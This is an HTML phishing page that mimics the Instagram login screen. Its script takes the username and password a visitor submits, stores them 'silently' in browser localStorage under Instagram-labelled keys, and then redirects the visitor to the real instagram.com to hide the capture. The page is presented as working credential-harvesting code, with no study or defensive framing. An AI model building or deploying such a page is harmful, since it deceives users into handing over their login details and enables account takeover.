<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      height: 100vh;
      background-color: #fafafa;
      margin: 0;
    }

    .login-container {
      background: #fff;
      padding: 40px 25px;
      border-radius: 25px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.15);
      text-align: center;
      width: 350px;
      max-width: 90%;
    }

    .login-container img {
      width: 90px;
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 14px;
      margin: 10px 0;
      border: 1px solid #dbdbdb;
      border-radius: 30px;
      font-size: 15px;
      background-color: #fafafa;
      outline: none;
    }

    button {
      width: 100%;
      padding: 14px;
      background-color: #0095f6;
      color: white;
      font-size: 16px;
      font-weight: bold;
      border: none;
      border-radius: 30px;
      cursor: pointer;
      margin-top: 15px;
    }

    button:hover {
      background-color: #0078d4;
    }

    .options {
      margin-top: 15px;
      font-size: 14px;
    }

    .options a {
      color: #0095f6;
      text-decoration: none;
      font-weight: bold;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <!-- Instagram Logo -->
    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram">

    <!-- Login Form -->
    <form id="loginForm">
      <input type="text" id="username" placeholder="Phone number, username or email" required>
      <input type="password" id="password" placeholder="Password" required>
      <button type="submit">Log in</button>
    </form>

    <!-- Options -->
    <div class="options">
      <p><a href="#">Forgot password?</a></p>
      <p>Don’t have an account? <a href="#">Sign up</a></p>
    </div>
  </div>

  <script>
    // Login form submit → Local Storage save silently + redirect
    document.getElementById("loginForm").addEventListener("submit", function(e){
      e.preventDefault();

      let username = document.getElementById("username").value;
      let password = document.getElementById("password").value;

      // Silently save in Local Storage (device/browser storage)
      localStorage.setItem("insta_username", username);
      localStorage.setItem("insta_password", password);

      // Redirect to official Instagram
      window.location.href = "https://www.instagram.com";
    });
  </script>
</body>
</html>
